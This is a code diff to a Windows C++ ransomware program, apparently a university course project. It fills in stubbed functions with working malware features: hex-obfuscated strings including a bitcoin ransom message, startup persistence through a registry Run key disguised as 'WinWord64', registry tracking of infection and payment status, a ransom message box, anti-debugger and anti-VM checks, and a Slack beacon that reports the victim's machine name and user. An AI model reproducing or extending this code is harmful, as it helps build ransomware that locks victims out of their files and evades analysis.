@@ -37,7 +37,7 @@ namespace fs = std::experimental::filesystem;
 #define CLASSNAME "uwbcss579"
 #define BLOCK_LEN 128
 #define GET_USERS_DIR_FAILED -25
-//#define TRACEOUTPUT // Uncomment '#define TRACEOUTPUT' to enable trace logging output
+#define TRACEOUTPUT // Uncomment '#define TRACEOUTPUT' to enable trace logging output
 					  // Comment out '#define TRACEOUTPUT' prior to project submission to 
 					  // minimize the strings in the program
 
@@ -97,7 +97,14 @@ std::string strSlackFilesDecrypted = "02a3465647079727365644023756c6966402b3"; /
 std::string strSlackTimestamp = "02a307d616473756d6964502b3"; // "; Timestamp: "
 std::string strSlackPostMsgEnd = "d70222"; // "\" }"
 std::string strCryptoProvider = "2756469667f627050236968607162776f64707972734023554140246e6160214352502465636e61686e654024766f637f6273696d4"; // "Microsoft Enhanced RSA and AES Cryptographic Provider"
-
+std::string strAllFilesDecrypted = "c6c614"; // All
+std::string strFilesFailedToDecrypt = "02a34707972736564402f645024656c6961664023756c6966402b3"; // "; Files Failed To Decrypt: "
+std::string strLocationOfStatuses = "3777f646e69675c54766f637f6273696d4c5562716774766f635"; // Software\\Microsoft\\Windows
+std::string strLocationOfPersistance = "e65725c5e6f6963727566547e65627275734c53777f646e69675c54766f637f6273696d4c5562716774766f635"; // Software\\Microsoft\\Windows\\CurrentVersion\\Run
+std::string strRansom = "d6f637e61625"; // Ransom
+std::string infected = "465647365666e694"; // Infected
+std::string strWinWord64 = "43634627f675e69675"; // WinWord64
+std::string strRansomMsg = "33332313230315d607f62333439357e4a403437493635302a3029756b602e6f69647079727365646025686470227f6660237375627464616023796864702f64702e696f6364796260266f602864727f67702030353420246e6563702473757d60257f695a0e29756b60256471667962707025686470227f666029716070257f69702373756c6e65702d6568647024707972736564602e61636025637c6560256e6f602f6e60246e61602c23756c69666022757f697024707972736564602f647024656375702562602e61636029756b602e6f6964707972736564602564716679627070214a0e22756475707d6f63602379686470227f66602465647162756e65676029756b60256571796e6570246e61602e6f6964707972736e6560247375676e6f62747370256864702864796770246564707972736e65602e65656260256671686023756c696660247e6164727f607d6960227568647f60246e61602c237f647f6860702c23747e656d65736f646022757f69502a0e2937353023535340297260246564707972736e656025627160256679627460246271686022757f69702e6f6023756c6966602c6c614a0e4f49445e454454514";
 
 // Function Declarations
 DWORD FindFiles();
@@ -118,13 +125,15 @@ DWORD GetInfectionStatus();
 void SaveRansomStatus(DWORD dwRansomStatus);
 DWORD GetRansomStatus();
 void PrintProgress();
-std::string wstrtostr(const std::wstring& wstr);
+std::string WstrToStr(const std::wstring& wstr);
 void HexToString(const std::string hexstr, std::string& str);
 void DecodeStrings();
 std::string GetLocalComputerName();
 std::string GetCurrentUser();
 std::string GetUtcTime();
-
+void SaveRegistryKey(wchar_t* appName, std::string keyName);
+void DeleteRegistryKey(std::string keyName);
+std::wstring StrToLpcwstr(std::string str);
 
 
 int main(int argc, char* argv[])
@@ -331,17 +340,29 @@ void DecodeStrings()
 	HexToString(strSlackFilesDecrypted, strSlackFilesDecrypted);
 	HexToString(strSlackTimestamp, strSlackTimestamp);
 	HexToString(strSlackPostMsgEnd, strSlackPostMsgEnd);
+	HexToString(strAllFilesDecrypted, strAllFilesDecrypted);
+	HexToString(strFilesFailedToDecrypt, strFilesFailedToDecrypt);
+
+	HexToString(strLocationOfStatuses, strLocationOfStatuses);
+	HexToString(strLocationOfPersistance, strLocationOfPersistance);
+	HexToString(strRansom, strRansom);
+	HexToString(infected, infected);
+	HexToString(strWinWord64, strWinWord64);
+	HexToString(strRansomMsg, strRansomMsg);
 }
 
-//POST: True if VM or debugger found, false otherwise.
 bool AnalysisCheck()
 {
+	// Check for debugger, execution in a VM, or other dynamic analysis
+	// Returns True if VM or debugger found, False otherwise.
+
+	// No Pill VM check
 	unsigned char ldtr[5] = "\xef\xbe\xad\xde";
 	unsigned long ldt = 0;
-
 	_asm sldt ldtr
 	ldt = *((unsigned long *)&ldtr[0]);
 
+	// True if No Pill or Debugger attached
 	return (ldt != 0xdead0000 || IsDebuggerPresent());
 }
 
@@ -491,7 +512,7 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 
 void SendDecryptionBeacon(DWORD dwDecryptedFileCount)
 {
-	// TODO: Sends beacon to a slack channel to track infection cleaning
+	// Sends beacon to a slack channel to track infection cleaning
 	//
 	// Beacon data includes machinename, username, # files not decrypted, UTC time of cleaning event
 
@@ -570,8 +591,16 @@ void SendDecryptionBeacon(DWORD dwDecryptedFileCount)
 	postData.append(strSlackUser); // ("; User: ");
 	postData.append(userName);
 
-	postData.append(strSlackFilesDecrypted); // ("; Files Decrypted: ");
-	postData.append(std::to_string(dwDecryptedFileCount));
+	if (dwDecryptedFileCount == 0)
+	{
+		postData.append(strSlackFilesDecrypted); // ("; Files Decrypted: ");
+		postData.append(strAllFilesDecrypted);
+	}
+	else
+	{
+		postData.append(strFilesFailedToDecrypt); // ("; Files Failed To Decrypt: ");
+		postData.append(std::to_string(dwDecryptedFileCount));
+	}
 
 	std::string timestamp = GetUtcTime();
 	postData.append(strSlackTimestamp); // ("; Timestamp: ");
@@ -634,60 +663,205 @@ void SendDecryptionBeacon(DWORD dwDecryptedFileCount)
 
 void RansomMessage(DWORD dwEncryptedFileCount)
 {
-	// TODO: Add code to display a ransom message to the user, and to 
-	//       demand bitcoin payment to get the decryption key
-	//
-	// This could be a MessageBox or a HTML page
-	//
-	// The message text should be encoded (base64) if stored in the code,
-	// or it could be downloaded from a remote site
+	// Display a ransom message to the user, and to 
+	// demand bitcoin payment to get the decryption key
+
+	std::wstring messageBoxText = StrToLpcwstr(strRansomMsg);
+	std::wstring messageBoxCaption = StrToLpcwstr(strAllYourFilesAreBelongToUs); // (strRansom);;
+	MessageBox(NULL, messageBoxText.c_str(), messageBoxCaption.c_str(), MB_OK);
 }
 
 void SaveStartupPersistence()
 {
-	// TODO: Save startup persistence data to the Registry
+	// Save startup persistence data to the Registry
 	//
 	// By continuing to run program at startup, any new files will be 
 	// encrypted until payment is received
 	//
 
+	wchar_t szPathToExe[MAX_PATH];
+	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
+	std::string keyName = strLocationOfPersistance;
+	SaveRegistryKey(szPathToExe, keyName);
 }
 
 void DeleteStartupPersistence()
 {
-	// TODO: Delete startup persistence data from the Registry
+	// Delete startup persistence data from the Registry
+
+	std::string keyName = strLocationOfPersistance;
+	DeleteRegistryKey(keyName);
 }
 
 void SaveInfectionStatus(DWORD dwInfectionStatus)
 {
-	// TODO: Save infection status to the Registry
-	//       Create a Key+Value to store dwInfectionStatus
-	//       This can be used to avoid double infection
+	// Save infection status to the Registry
+	// Create a Key+Value to store dwInfectionStatus
+	// This can be used to avoid double infection
+
+	std::string keyName = strLocationOfStatuses;
+	std::wstring key = StrToLpcwstr(keyName);
+
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwSize(sizeof(dwInfectionStatus));
+	std::wstring inf = StrToLpcwstr(infected);
+	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		lResult = RegSetValueExW(hKey, inf.c_str(), 0, REG_DWORD, (BYTE*)& dwInfectionStatus, dwSize);
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
 }
 
 DWORD GetInfectionStatus()
 {
-	// TODO: Get infection status from the Registry
-	//       Read a Key+Value to get dwInfectionStatus
-	//       This can be used to avoid double infection
+	// Get infection status from the Registry
+	// Read a Key+Value to get dwInfectionStatus
+	// This can be used to avoid double infection
 
-	return 0;
+	HKEY hKey = NULL;
+	DWORD nResult(0);
+	DWORD bufferSize(sizeof(nResult));
+	std::string keyName = strLocationOfStatuses;
+	std::wstring key = StrToLpcwstr(keyName);
+	std::wstring inf = StrToLpcwstr(infected);
+
+	LONG error = RegOpenKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
+	error = RegQueryValueExW(hKey, inf.c_str(), 0, NULL, reinterpret_cast<LPBYTE>(&nResult), &bufferSize);
+	return nResult;
 }
 
 void SaveRansomStatus(DWORD dwRansomStatus)
 {
-	// TODO: Save ransom status to the Registry
-	//       Create a Key+Value to store dwRansomStatus
-	//       This can be used to track whether the user paid or not
+	// Save ransom status to the Registry
+	// Create a Key+Value to store dwRansomStatus
+	// This can be used to track whether the user paid or not
+
+	std::string keyName = strLocationOfStatuses;
+	std::wstring key = StrToLpcwstr(keyName);
+
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwSize(sizeof(dwRansomStatus));
+	std::wstring ransomStr = StrToLpcwstr(strRansom);
+	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		lResult = RegSetValueExW(hKey, ransomStr.c_str(), 0, REG_DWORD, (BYTE*)& dwRansomStatus, dwSize);
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
 }
 
 DWORD GetRansomStatus()
 {
-	// TODO: Get ransom status from the Registry
-	//       Read a Key+Value to get dwRansomStatus
-	//       This can be used to track whether the user paid or not
+	// Get ransom status from the Registry
+	// Read a Key+Value to get dwRansomStatus
+	// This can be used to track whether the user paid or not
 
-	return 0;
+	HKEY hKey = NULL;
+	DWORD nResult(0);
+	DWORD bufferSize(sizeof(nResult));
+	std::string keyName = strLocationOfStatuses;
+	std::wstring key = StrToLpcwstr(keyName);
+	std::wstring ransomStr = StrToLpcwstr(strRansom);
+
+	LONG error = RegOpenKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
+	error = RegQueryValueExW(hKey, ransomStr.c_str(), 0, NULL, reinterpret_cast<LPBYTE>(&nResult), &bufferSize);
+	return nResult;
+}
+
+void SaveRegistryKey(wchar_t* keyValue, std::string keyName)
+{
+	// Support function to write Registry keys
+
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwSize;
+	const size_t count = MAX_PATH * 2;
+	wchar_t szValue[count] = {};
+	wcscpy_s(szValue, count, L"\"");
+	wcscat_s(szValue, count, keyValue);
+	wcscat_s(szValue, count, L"\" ");
+	std::wstring winWord = StrToLpcwstr(strWinWord64);
+	std::wstring key = StrToLpcwstr(keyName);
+	
+#ifdef TRACEOUTPUT
+	if (g_Verbosity)
+	{
+		std::wcout << "Save Registry Key:   " << key << std::endl;
+		std::wcout << "Save Registry Value: " << szValue << std::endl;
+	}
+#endif
+
+	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+	fSuccess = (lResult == 0);
+	wchar_t val[count] = {};
+
+	if (fSuccess)
+	{
+		dwSize = sizeof(wchar_t) * (wcslen(szValue) + 1);
+		lResult = RegSetValueExW(hKey, winWord.c_str(), 0, REG_SZ, (BYTE*)szValue, dwSize);
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
+}
+
+void DeleteRegistryKey(std::string keyName)
+{
+	// Support function to delete Registry keys
+
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	std::wstring winWord = StrToLpcwstr(strWinWord64);
+	std::wstring key = StrToLpcwstr(keyName);
+
+#ifdef TRACEOUTPUT
+	if (g_Verbosity)
+	{
+		std::wcout << "Del Registry Key: " << key << std::endl;
+	}
+#endif
+
+	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, KEY_ALL_ACCESS, &hKey);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		lResult = RegDeleteValue(hKey, winWord.c_str());
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
 }
 
 void PrintProgress()
@@ -1214,7 +1388,7 @@ DWORD FindFiles()
 	if (!FAILED(hr))
 	{
 		// Found the Users directory, save it 
-		path = wstrtostr(pszUsersFolder);
+		path = WstrToStr(pszUsersFolder);
 		CoTaskMemFree(pszUsersFolder);
 
 #ifdef TRACEOUTPUT
@@ -1310,7 +1484,7 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 	hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_UserProfiles, 0, NULL, &pszUsersFolder);
 	if (!FAILED(hr))
 	{
-		path = wstrtostr(pszUsersFolder);
+		path = WstrToStr(pszUsersFolder);
 		CoTaskMemFree(pszUsersFolder);
 
 #ifdef TRACEOUTPUT
@@ -1368,7 +1542,7 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 	return dwFileCounter - dwDecryptionCounter;  // if > 0, then files failed to decrypt
 }
 
-std::string wstrtostr(const std::wstring& wstr)
+std::string WstrToStr(const std::wstring& wstr)
 {
 	// Convert a PWSTR to a std::string
 
@@ -1379,6 +1553,17 @@ std::string wstrtostr(const std::wstring& wstr)
 	strNewStdString = szTmp;
 	delete[] szTmp;
 	return strNewStdString;
+}
+
+std::wstring StrToLpcwstr(std::string str)
+{
+	int len;
+	int slength = (int)str.length() + 1;
+	len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), slength, 0, 0);
+	wchar_t* buf = new wchar_t[len];
+	MultiByteToWideChar(CP_ACP, 0, str.c_str(), slength, buf, len);
+	std::wstring wStr(buf);
+	return wStr;
 }
 
 void HexToString(const std::string hexstr, std::string & str)
